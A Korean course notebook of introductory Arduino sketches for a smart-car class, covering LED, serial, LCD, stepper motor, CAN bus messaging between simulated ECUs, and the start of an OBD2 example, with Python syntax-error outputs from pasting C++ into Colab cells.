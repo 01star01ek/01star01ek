{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyM60oyswdGY9Dn3k/GXLi5M",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/01star01ek/01star01ek/blob/main/%EC%8A%A4%EB%A7%88%ED%8A%B8_%EC%9E%90%EB%8F%99%EC%B0%A8_%EA%B3%BC%EC%A0%95_%EC%BD%94%EB%93%9C_(1%EC%9D%BC%EC%B0%A8).ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# **스마트자동차 과정 코드(1일차)**\n",
        "\n",
        "코드정렬을 원하시면, 전체 선택 후 Ctrl + T를 눌러 정렬해 주세요."
      ],
      "metadata": {
        "id": "8UEey-OvknqB"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "# 1. LED BLINKING"
      ],
      "metadata": {
        "id": "mdk3NcedwdLy"
      }
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 111
        },
        "id": "adCWWYXHO1Of",
        "outputId": "6994a59b-cebc-4b06-a847-27a60ba35388"
      },
      "outputs": [
        {
          "output_type": "error",
          "ename": "SyntaxError",
          "evalue": "invalid syntax (ipython-input-1363856703.py, line 1)",
          "traceback": [
            "\u001b[0;36m  File \u001b[0;32m\"/tmp/ipython-input-1363856703.py\"\u001b[0;36m, line \u001b[0;32m1\u001b[0m\n\u001b[0;31m    // the setup function runs once when you press reset or power the board\u001b[0m\n\u001b[0m    ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid syntax\n"
          ]
        }
      ],
      "source": [
        "\n",
        "// the setup function runs once when you press reset or power the board\n",
        "void setup() {\n",
        "// initialize digital pin LED_BUILTIN as an output.\n",
        "  pinMode(LED_BUILTIN, OUTPUT);\n",
        "}\n",
        "// the loop function runs over and over again forever\n",
        "void loop() {\n",
        "  digitalWrite(LED_BUILTIN, HIGH);// turn the LED on (HIGH is the voltage level)\n",
        "  delay(1000); // wait for a second\n",
        "  digitalWrite(LED_BUILTIN, LOW); // turn the LED off by making the voltage LOW\n",
        "  delay(1000);// wait for a second\n",
        "}"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# 2. Serial 출력 예제"
      ],
      "metadata": {
        "id": "B-PY2AsZwhLx"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "void setup() {\n",
        "  Serial.begin(115200);\n",
        "}\n",
        "\n",
        "//hello world 계속 출력하는 예제\n",
        "void loop() {\n",
        "  Serial.println(\"hello world\\n\");\n",
        "  delay(1000);\n",
        "}"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 110
        },
        "id": "cQVg0QlcP_gt",
        "outputId": "e5d479ff-046e-4231-f7af-12bfb1a17dbf"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "SyntaxError",
          "evalue": "invalid syntax (<ipython-input-4-75f41efc4e10>, line 1)",
          "traceback": [
            "\u001b[0;36m  File \u001b[0;32m\"<ipython-input-4-75f41efc4e10>\"\u001b[0;36m, line \u001b[0;32m1\u001b[0m\n\u001b[0;31m    void setup() {\u001b[0m\n\u001b[0m         ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid syntax\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# 3. Serial 입력 예제"
      ],
      "metadata": {
        "id": "dArx1Zo5wkms"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "void setup() {\n",
        "  // put your setup code here, to run once:\n",
        "  Serial.begin(115200);\n",
        "  Serial.println(\"Type: \");\n",
        "}\n",
        "\n",
        "//내가 입력하는 문장을 출력하는 예제\n",
        "void loop() {\n",
        "  // put your main code here, to run repeatedly:\n",
        "  if(Serial.available()){\n",
        "    String c = Serial.readStringUntil('\\n');\n",
        "    Serial.println(c);\n",
        "  }\n",
        "}\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 110
        },
        "id": "jCiDerdATuST",
        "outputId": "181fa3fc-8007-4b84-c042-fdf9d8c723ba"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "SyntaxError",
          "evalue": "invalid syntax (<ipython-input-5-e75ca3c67a55>, line 1)",
          "traceback": [
            "\u001b[0;36m  File \u001b[0;32m\"<ipython-input-5-e75ca3c67a55>\"\u001b[0;36m, line \u001b[0;32m1\u001b[0m\n\u001b[0;31m    void setup() {\u001b[0m\n\u001b[0m         ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid syntax\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# 4. 아두이노 LCD 출력 예제"
      ],
      "metadata": {
        "id": "p9Ye2IUiwo1E"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#include <Wire.h>\n",
        "#include <LiquidCrystal_I2C.h>\n",
        "\n",
        "LiquidCrystal_I2C lcd(0x27,16,2);\n",
        "\n",
        "void setup()\n",
        "{\n",
        "  lcd.init(); // initialize the lcd\n",
        "  lcd.backlight();\n",
        "  lcd.setCursor(0, 0);\n",
        "  lcd.print(\"Hello, Light\");\n",
        "  lcd.setCursor(0, 1);\n",
        "  lcd.print(\"Mission complete\");\n",
        "}\n",
        "\n",
        "void loop()\n",
        "{\n",
        "}"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 110
        },
        "id": "tSoHyBrPT6lA",
        "outputId": "79fbbc20-46da-4282-fd05-afb715611cfb"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "SyntaxError",
          "evalue": "invalid syntax (<ipython-input-6-90d389d0db36>, line 1)",
          "traceback": [
            "\u001b[0;36m  File \u001b[0;32m\"<ipython-input-6-90d389d0db36>\"\u001b[0;36m, line \u001b[0;32m1\u001b[0m\n\u001b[0;31m    LiquidCrystal_I2C lcd(0x27,16,2); void setup()\u001b[0m\n\u001b[0m                      ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid syntax\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# 5. 모터 구동 예제"
      ],
      "metadata": {
        "id": "lPOHX4KkwsYQ"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#include <AccelStepper.h>\n",
        "\n",
        "//파라미터 없으면 자동으로 4핀 제어하며, 핀 번호 2, 3, 4, 5 로 자동 설정\n",
        "AccelStepper stepper(AccelStepper::DRIVER, 3, 4);\n",
        "void setup() {\n",
        "  stepper.setMaxSpeed(10000); // 최대 속도 설정\n",
        "  stepper.setSpeed(10000);// 원하는 속도 설정\n",
        "}\n",
        "void loop() {\n",
        "  stepper.runSpeed(); // 계속 이 속도로 회전\n",
        "}\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 110
        },
        "id": "afzHmBfOUZoe",
        "outputId": "c3324fcb-6837-4737-fec9-116d5c5003d7"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "SyntaxError",
          "evalue": "invalid syntax (<ipython-input-7-9b02b57bf18f>, line 5)",
          "traceback": [
            "\u001b[0;36m  File \u001b[0;32m\"<ipython-input-7-9b02b57bf18f>\"\u001b[0;36m, line \u001b[0;32m5\u001b[0m\n\u001b[0;31m    // 드라이버 사용, PUL은 3번 핀, DIR은 4번 핀\u001b[0m\n\u001b[0m    ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid syntax\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# 6. Can communication1\n"
      ],
      "metadata": {
        "id": "ircYTo1llXip"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 6. Can communication 1_Send"
      ],
      "metadata": {
        "id": "2Pc7iJQfwwhN"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#include \"DFRobot_MCP2515.h\"\n",
        "const int SPI_CS_PIN = 10;\n",
        "DFRobot_MCP2515 CAN(SPI_CS_PIN); // Set CS pin\n",
        "void setup()\n",
        "{\n",
        "  Serial.begin(115200);\n",
        "  while( CAN.begin(CAN_500KBPS) ){ // init can bus : baudrate = 500k\n",
        "    Serial.println(\"DFROBOT's CAN BUS Shield init fail\");\n",
        "    Serial.println(\"Please Init CAN BUS Shield again\");\n",
        "    delay(3000);\n",
        "  }\n",
        "  Serial.println(\"DFROBOT's CAN BUS Shield init ok!\\n\");\n",
        "}\n",
        "\n",
        "unsigned char data[8] = {'D', 'F', 'R', 'O', 'B', 'O', 'T', '!'};\n",
        "void loop()\n",
        "{\n",
        "  // send data: id = 0x06, standrad flame, data len = 8, data: data buf\n",
        "  CAN.sendMsgBuf(0x06, 0, 8, data);\n",
        "  delay(100); // send data per 100ms\n",
        "}\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 110
        },
        "id": "HKKQQmxFU9FO",
        "outputId": "2221a451-f386-4867-e703-3aaba9cff8e7"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "SyntaxError",
          "evalue": "invalid non-printable character U+000B (<ipython-input-8-6e5ea08a3eb5>, line 2)",
          "traceback": [
            "\u001b[0;36m  File \u001b[0;32m\"<ipython-input-8-6e5ea08a3eb5>\"\u001b[0;36m, line \u001b[0;32m2\u001b[0m\n\u001b[0;31m    \u001b[0m\n\u001b[0m    ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid non-printable character U+000B\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 6. Can communication 1_Recieve"
      ],
      "metadata": {
        "id": "6YwfalIRw0q4"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#include \"DFRobot_MCP2515.h\"\n",
        "const int SPI_CS_PIN = 10;\n",
        "DFRobot_MCP2515 CAN(SPI_CS_PIN); // Set CS pin\n",
        "void setup()\n",
        "{\n",
        "  Serial.begin(115200);\n",
        "  while( CAN.begin(CAN_500KBPS) ){   // init can bus : baudrate = 500k\n",
        "    Serial.println(\"DFROBOT's CAN BUS Shield init fail\");\n",
        "    Serial.println(\"Please Init CAN BUS Shield again\");\n",
        "    delay(3000);\n",
        "  }\n",
        "   Serial.println(\"DFROBOT's CAN BUS Shield init ok!\\n\");\n",
        "}\n",
        "\n",
        "void loop()\n",
        "{\n",
        "  unsigned char len = 0;\n",
        "  unsigned char buf[8];\n",
        "  if(CAN_MSGAVAIL == CAN.checkReceive()) // check if data coming\n",
        "  {\n",
        "      CAN.readMsgBuf(&len, buf); // read data, len: data length, buf: data buf\n",
        "      for(int i = 0; i<len; i++) // print the data\n",
        "      {\n",
        "        Serial.write(buf[i]);\n",
        "        Serial.print(\"\\t\");\n",
        "      }\n",
        "      Serial.println();\n",
        "  }\n",
        "}\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 110
        },
        "id": "6f7clEktU_PL",
        "outputId": "94ddd6fc-5b7e-4907-88a9-a4ee51ecec7f"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "SyntaxError",
          "evalue": "invalid non-printable character U+000B (<ipython-input-10-013631d399b5>, line 2)",
          "traceback": [
            "\u001b[0;36m  File \u001b[0;32m\"<ipython-input-10-013631d399b5>\"\u001b[0;36m, line \u001b[0;32m2\u001b[0m\n\u001b[0;31m    \u001b[0m\n\u001b[0m    ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid non-printable character U+000B\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# 7.Can communication2"
      ],
      "metadata": {
        "id": "wyvXnETEl005"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 7. Can communication 2_send"
      ],
      "metadata": {
        "id": "E_kK7ix-w815"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#include \"DFRobot_MCP2515.h\"\n",
        "const int SPI_CS_PIN = 10; // SPI CS 핀 설정\n",
        "DFRobot_MCP2515 CAN(SPI_CS_PIN); // MCP2515 객체 생성\n",
        "\n",
        "// 전송할 데이터 배열 (속도 + 온도)\n",
        "unsigned char data[2] = {0};\n",
        "\n",
        "void setup() {\n",
        "  Serial.begin(115200);\n",
        "  randomSeed(analogRead(0));\n",
        "  while (CAN.begin(CAN_500KBPS)) {\n",
        "      Serial.println(\"CAN 버스 초괴화 실패\");\n",
        "  }\n",
        "\n",
        "  Serial.println(\"CAN 버스 초괴화 성공\");\n",
        "}\n",
        "\n",
        "void loop() {\n",
        "  // 무작위 속도 (0~100km/h), 온도 (0~99도)\n",
        "  int speed = random(0, 101);\n",
        "  int temperature = random(0, 100);\n",
        "  data[0] = speed; // 속도 저장\n",
        "  data[1] = temperature; // 온도 저장\n",
        "\n",
        "  // CAN 메시지 전송: ID = 0x123\n",
        "  CAN.sendMsgBuf(0x123, 0, 2, data);\n",
        "  Serial.println(\"Send\");\n",
        "  delay(100); // 100ms마다 데이터 전송\n",
        "}\n"
      ],
      "metadata": {
        "id": "n-3aGx_2VxgR"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 7. Can communication 2_receive"
      ],
      "metadata": {
        "id": "vXvDfS1RxBUJ"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#include \"DFRobot_MCP2515.h\"\n",
        "const int SPI_CS_PIN = 10; // SPI CS 핀 설정\n",
        "DFRobot_MCP2515 CAN(SPI_CS_PIN); // CAN 객체 생성 (DFROBOT 라이브러리 사용)\n",
        "void setup() {\n",
        "  Serial.begin(115200); // 시리얼 통신 시작\n",
        "  while (CAN.begin(CAN_500KBPS)) {\n",
        "    Serial.println(\"CAN 버스 초괴화 실패\");\n",
        "    delay(3000);\n",
        "  }\n",
        "  Serial.println(\"CAN 버스 초괴화 성공\");\n",
        "}\n",
        "\n",
        "void loop() {\n",
        "  unsigned char len = 0;// 수신 데이터 길이\n",
        "  unsigned char buf[2];// 수신 데이터 버퍼\n",
        "\n",
        "  // CAN 메시지가 수신되었는지 확인\n",
        "  if (CAN.checkReceive() == CAN_MSGAVAIL) {\n",
        "    CAN.readMsgBuf(&len, buf);\n",
        "    Serial.print(\"ID: 0x\");\n",
        "    Serial.print(CAN.getCanId(), HEX);\n",
        "    Serial.print(\" | \");\n",
        "    for (int i = 0; i < len; i++) {\n",
        "      Serial.print(buf[i]);\n",
        "      Serial.print(\" \");\n",
        "    }\n",
        "  Serial.println();\n",
        "  }\n",
        "}\n"
      ],
      "metadata": {
        "id": "O-r1xn7TW_fG"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# 8.Can communication3"
      ],
      "metadata": {
        "id": "6Au4JOO7l-S8"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 8. Can communication 3_send"
      ],
      "metadata": {
        "id": "k6O2dx0KxGv0"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#include \"DFRobot_MCP2515.h\"\n",
        "const int SPI_CS_PIN = 10;\n",
        "DFRobot_MCP2515 CAN(SPI_CS_PIN);\n",
        "String input = \"\";\n",
        "unsigned char data[2] = { 0, 0 }; // data[0] = speed, data[1] = temperature\n",
        "bool locked = false;\n",
        "void setup() {\n",
        "  Serial.begin(115200);\n",
        "  randomSeed(analogRead(0));\n",
        "  // CAN 통신 초기화 (500kbps)\n",
        "  while (CAN.begin(CAN_500KBPS)) {\n",
        "    Serial.println(\"CAN 버스 초괴화 실패\");\n",
        "    delay(3000);\n",
        "  }\n",
        "  Serial.println(\"CAN 버스 초괴화 성공\");\n",
        "}\n",
        "\n",
        "void loop() {\n",
        "\n",
        "  if (Serial.available()) {\n",
        "    input = Serial.readStringUntil('\\n');\n",
        "    input.trim();\n",
        "    int val = input.toInt();\n",
        "\n",
        "    // 100 입력 시 고정\n",
        "    if (!locked) {\n",
        "      if (val == 100) {\n",
        "        locked = true;\n",
        "        data[1] = 100;\n",
        "        Serial.println(\"input temperature: 100\");\n",
        "      }\n",
        "      else {\n",
        "        data[1] = val;\n",
        "        Serial.print(\"input temperature: \");\n",
        "        Serial.println(val);\n",
        "      }\n",
        "    }\n",
        "  }\n",
        "  // 랜덤한 온도\n",
        "  else if (!locked && !Serial.available()) {\n",
        "     data[1] = random(0, 100);\n",
        "  }\n",
        "\n",
        "  // 랜덤한 속도\n",
        "  data[0] = random(0, 100);\n",
        "  if(!locked) {\n",
        "    Serial.println(\"Send (Please enter the temperature)\");\n",
        "  }\n",
        "    CAN.sendMsgBuf(0x123, 0, 2, data);\n",
        "  delay(100);\n",
        "}"
      ],
      "metadata": {
        "id": "uCXp4qezXsoo"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 8. Can communication 3_receive\n"
      ],
      "metadata": {
        "id": "IRp5IcWSxKlr"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "#include \"DFRobot_MCP2515.h\"\n",
        "#include <Wire.h>\n",
        "#include <LiquidCrystal_I2C.h>\n",
        "\n",
        "const int SPI_CS_PIN = 10;\n",
        "DFRobot_MCP2515 CAN(SPI_CS_PIN);\n",
        "LiquidCrystal_I2C lcd(0x27,16,2);\n",
        "\n",
        "void setup()\n",
        "{\n",
        "    Serial.begin(115200);\n",
        "\n",
        "    while( CAN.begin(CAN_500KBPS) ){\n",
        "        Serial.println(\"DFROBOT's CAN BUS Shield init fail\");\n",
        "        Serial.println(\"Please Init CAN BUS Shield again\");\n",
        "        delay(3000);\n",
        "    }\n",
        "    Serial.println(\"DFROBOT's CAN BUS Shield init ok!\\n\");\n",
        "\n",
        "    // lcd 기본 코드\n",
        "    lcd.init();\n",
        "    lcd.backlight();\n",
        "    lcd.setCursor(0,0);\n",
        "    lcd.print(\"Ready for CAN\");\n",
        "}\n",
        "\n",
        "void loop()\n",
        "{\n",
        "    unsigned char len = 0;\n",
        "    unsigned char buf[2];\n",
        "\n",
        "    if(CAN_MSGAVAIL == CAN.checkReceive())\n",
        "    {\n",
        "        CAN.readMsgBuf(&len, buf);\n",
        "\n",
        "        Serial.print(\"ID : 0x\");\n",
        "        Serial.print(CAN.getCanId(), HEX);\n",
        "         Serial.print(\"\\t\");\n",
        "        for(int i = 0; i<len; i++)\n",
        "        {\n",
        "            // 온도가 100이면 HOT 경고 출력\n",
        "            if(i == 1 && buf[1] == 100) {\n",
        "                lcd.clear();\n",
        "                lcd.setCursor(0,0);\n",
        "                lcd.print(\"HOT\");\n",
        "                Serial.print(buf[i]);\n",
        "                Serial.print(\"\\t\");\n",
        "            }\n",
        "            else {\n",
        "                lcd.clear();\n",
        "                lcd.setCursor(0,0);\n",
        "                lcd.print(\"T:\");\n",
        "                lcd.print(buf[1]);\n",
        "                Serial.print(buf[i]);\n",
        "                Serial.print(\"\\t\");\n",
        "            }\n",
        "        }\n",
        "        Serial.println();\n",
        "    }\n",
        "}"
      ],
      "metadata": {
        "id": "MxpZQdyMZEUn",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 109
        },
        "outputId": "85dc304b-b140-4700-cd07-c45102fa3865"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "SyntaxError",
          "evalue": "invalid syntax (<ipython-input-1-c04bb27a6c77>, line 5)",
          "traceback": [
            "\u001b[0;36m  File \u001b[0;32m\"<ipython-input-1-c04bb27a6c77>\"\u001b[0;36m, line \u001b[0;32m5\u001b[0m\n\u001b[0;31m    const int SPI_CS_PIN = 10;\u001b[0m\n\u001b[0m          ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid syntax\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# 9. Can communication4"
      ],
      "metadata": {
        "id": "bbGUQtnnmJA9"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 9. Can communication 4_ECU1"
      ],
      "metadata": {
        "id": "eAEJoZyoxO0m"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#include \"DFRobot_MCP2515.h\"\n",
        "\n",
        "const int SPI_CS_PIN = 10;\n",
        "DFRobot_MCP2515 CAN(SPI_CS_PIN);\n",
        "\n",
        "// 데이터 버퍼\n",
        "unsigned char data_0x110[8] = {0};\n",
        "unsigned char data_0x210[8] = {0};\n",
        "unsigned char data_0x51[8]  = {0};\n",
        "\n",
        "// 마지막 전송 시간 기록\n",
        "unsigned long last_0x110 = 0;\n",
        "unsigned long last_0x210 = 0;\n",
        "unsigned long last_0x51  = 0;\n",
        "\n",
        "// 전송 주기 (ms)\n",
        "const unsigned int interval_0x110 = 100;\n",
        "const unsigned int interval_0x210 = 200;\n",
        "const unsigned int interval_0x51  = 50;\n",
        "\n",
        "void setup() {\n",
        "  Serial.begin(115200);\n",
        "  randomSeed(analogRead(0));\n",
        "\n",
        "  while (CAN.begin(CAN_500KBPS)) {\n",
        "    Serial.println(\"CAN 버스 초괴화 실패\");\n",
        "    delay(3000);\n",
        "  }\n",
        "  Serial.println(\"CAN 버스 초괴화 성공\");\n",
        "}\n",
        "\n",
        "void loop() {\n",
        "  unsigned long now = millis();\n",
        "\n",
        "  // 0x110 전송\n",
        "  if (now - last_0x110 >= interval_0x110) {\n",
        "    for (int i = 0; i < 8; i++) data_0x110[i] = random(0, 256);\n",
        "    CAN.sendMsgBuf(0x110, 0, 8, data_0x110);\n",
        "    last_0x110 = now;\n",
        "  }\n",
        "\n",
        "  // 0x210 전송\n",
        "  if (now - last_0x210 >= interval_0x210) {\n",
        "    for (int i = 0; i < 8; i++) data_0x210[i] = random(0, 256);\n",
        "    CAN.sendMsgBuf(0x210, 0, 8, data_0x210);\n",
        "    last_0x210 = now;\n",
        "  }\n",
        "\n",
        "  // 0x51 전송\n",
        "  if (now - last_0x51 >= interval_0x51) {\n",
        "    for (int i = 0; i < 8; i++) data_0x51[i] = random(0, 256);\n",
        "    CAN.sendMsgBuf(0x51, 0, 8, data_0x51);\n",
        "    last_0x51 = now;\n",
        "  }\n",
        "\n",
        "  // 수신 데이터 출력\n",
        "  if (CAN.checkReceive() == CAN_MSGAVAIL) {\n",
        "    unsigned char len = 0;\n",
        "    unsigned char buf[8];\n",
        "    CAN.readMsgBuf(&len, buf);\n",
        "    unsigned long canId = CAN.getCanId();\n",
        "\n",
        "    Serial.print(\"ID: 0x\");\n",
        "    Serial.print(canId, HEX);\n",
        "    Serial.print(\" | DLC: \");\n",
        "    Serial.print(len);\n",
        "    Serial.print(\" | Data: \");\n",
        "    for (int i = 0; i < len; i++) {\n",
        "      Serial.print(buf[i], HEX);\n",
        "      Serial.print(\" \");\n",
        "    }\n",
        "    Serial.println();\n",
        "  }\n",
        "}"
      ],
      "metadata": {
        "id": "Qcu0d9uBbzPP"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 9. Can communication 4_ECU2\n"
      ],
      "metadata": {
        "id": "ZXkEPGgMxYlt"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#include \"DFRobot_MCP2515.h\"\n",
        "const int SPI_CS_PIN = 10;\n",
        "DFRobot_MCP2515 CAN(SPI_CS_PIN);\n",
        "\n",
        "// 데이터 버퍼\n",
        "unsigned char data_0x200[8] = {0};\n",
        "unsigned char data_0x100[8] = {0};\n",
        "unsigned char data_0x120[8] = {0};\n",
        "unsigned char data_0x220[8] = {0};\n",
        "unsigned char data_0x700[8] = {0};\n",
        "\n",
        "// 마지막 전송 시간 기록\n",
        "unsigned long last_0x200 = 0;\n",
        "unsigned long last_0x100 = 0;\n",
        "unsigned long last_0x120 = 0;\n",
        "unsigned long last_0x220 = 0;\n",
        "unsigned long last_0x700 = 0;\n",
        "\n",
        "// 전송 간격 (ms)\n",
        "const unsigned int interval_0x200  = 200;\n",
        "const unsigned int interval_0x100  = 100;\n",
        "const unsigned int interval_0x120  = 100;\n",
        "const unsigned int interval_0x220  = 200;\n",
        "const unsigned int interval_0x700 = 700;\n",
        "\n",
        "void setup() {\n",
        "  Serial.begin(115200);\n",
        "  randomSeed(analogRead(0));  // 무작위 시드 설정\n",
        "\n",
        "  while (CAN.begin(CAN_500KBPS)) {\n",
        "    Serial.println(\"CAN 버스 초괴화 실패\");\n",
        "    delay(3000);\n",
        "  }\n",
        "  Serial.println(\"CAN 버스 초괴화 성공\");\n",
        "}\n",
        "\n",
        "void loop() {\n",
        "  unsigned long now = millis();\n",
        "\n",
        "  if (now - last_0x200 >= interval_0x200) {\n",
        "    for (int i = 0; i < 8; i++) data_0x200[i] = random(0, 256);\n",
        "    CAN.sendMsgBuf(0x200, 0, 8, data_0x200);\n",
        "    last_0x200 = now;\n",
        "  }\n",
        "\n",
        "  if (now - last_0x100 >= interval_0x100) {\n",
        "    for (int i = 0; i < 8; i++) data_0x100[i] = random(0, 256);\n",
        "    CAN.sendMsgBuf(0x100, 0, 8, data_0x100);\n",
        "    last_0x100 = now;\n",
        "  }\n",
        "\n",
        "  if (now - last_0x120 >= interval_0x120) {\n",
        "    for (int i = 0; i < 8; i++) data_0x120[i] = random(0, 256);\n",
        "    CAN.sendMsgBuf(0x120, 0, 8, data_0x120);\n",
        "    last_0x120 = now;\n",
        "  }\n",
        "\n",
        "  if (now - last_0x220 >= interval_0x220) {\n",
        "    for (int i = 0; i < 8; i++) data_0x220[i] = random(0, 256);\n",
        "    CAN.sendMsgBuf(0x220, 0, 8, data_0x220);\n",
        "    last_0x220 = now;\n",
        "  }\n",
        "\n",
        "  if (now - last_0x700 >= interval_0x700) {\n",
        "    for (int i = 0; i < 8; i++) data_0x700[i] = random(0, 256);\n",
        "    CAN.sendMsgBuf(0x700, 0, 8, data_0x700);\n",
        "    last_0x700 = now;\n",
        "  }\n",
        "\n",
        "  // 수신된 메시지 출력\n",
        "  if (CAN.checkReceive() == CAN_MSGAVAIL) {\n",
        "    unsigned char len = 0;\n",
        "    unsigned char buf[8];\n",
        "    CAN.readMsgBuf(&len, buf);\n",
        "    unsigned long canId = CAN.getCanId();\n",
        "\n",
        "    Serial.print(\"ID: 0x\");\n",
        "    Serial.print(canId, HEX);\n",
        "    Serial.print(\" | DLC: \");\n",
        "    Serial.print(len);\n",
        "    Serial.print(\" | Data: \");\n",
        "    for (int i = 0; i < len; i++) {\n",
        "      Serial.print(buf[i], HEX);\n",
        "      Serial.print(\" \");\n",
        "    }\n",
        "    Serial.println();\n",
        "  }\n",
        "}\n"
      ],
      "metadata": {
        "id": "RfLc24VocKl3"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 9. Can communication 4_ECU3"
      ],
      "metadata": {
        "id": "r_vcNyn1xcNo"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#include \"DFRobot_MCP2515.h\"\n",
        "\n",
        "const int SPI_CS_PIN = 10;\n",
        "DFRobot_MCP2515 CAN(SPI_CS_PIN);\n",
        "\n",
        "void setup() {\n",
        "  Serial.begin(115200);\n",
        "  while (CAN.begin(CAN_500KBPS)) {\n",
        "    Serial.println(\"CAN 버스 초괴화 실패\");\n",
        "    delay(3000);\n",
        "  }\n",
        "  Serial.println(\"CAN 버스 초괴화 성공\");\n",
        "}\n",
        "\n",
        "void loop() {\n",
        "  if (CAN.checkReceive() == CAN_MSGAVAIL) {\n",
        "    unsigned char len = 0;\n",
        "    unsigned char buf[8];\n",
        "    CAN.readMsgBuf(&len, buf);\n",
        "    unsigned long canId = CAN.getCanId();\n",
        "\n",
        "    if (canId >= 0x100 && canId <= 0x1FF) {\n",
        "      Serial.print(\"ID: 0x\");\n",
        "      Serial.print(canId, HEX);\n",
        "      Serial.print(\" | DLC: \");\n",
        "      Serial.print(len);\n",
        "      Serial.print(\" | Data: \");\n",
        "      for (int i = 0; i < len; i++) {\n",
        "        Serial.print(buf[i], HEX);\n",
        "        Serial.print(\" \");\n",
        "      }\n",
        "      Serial.println();\n",
        "    }\n",
        "  }\n",
        "}"
      ],
      "metadata": {
        "id": "TV8tU-pQcV6d"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# 10. OBD2_ECU"
      ],
      "metadata": {
        "id": "y2mVECnkmS-H"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 10. OBD2_ECU1"
      ],
      "metadata": {
        "id": "1RAghYQvxewQ"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#include \"DFRobot_MCP2515.h\"\n",
        "\n",
        "const int SPI_CS_PIN = 10;\n",
        "DFRobot_MCP2515 CAN(SPI_CS_PIN);\n",
        "\n",
        "void setup() {\n",
        "  Serial.begin(115200);\n",
        "  randomSeed(analogRead(0));\n",
        "\n",
        "  while (CAN.begin(CAN_500KBPS)) {\n",
        "    Serial.println(\"CAN 초기화 실패\");\n",
        "    delay(3000);\n",
        "  }\n",
        "\n",
        "  Serial.println(\"ECU1 시작 - 온도 응답 담당\");\n",
        "}\n",
        "\n",
        "void loop() {\n",
        "  if (CAN.checkReceive() == CAN_MSGAVAIL) {\n",
        "    unsigned char len = 0;\n",
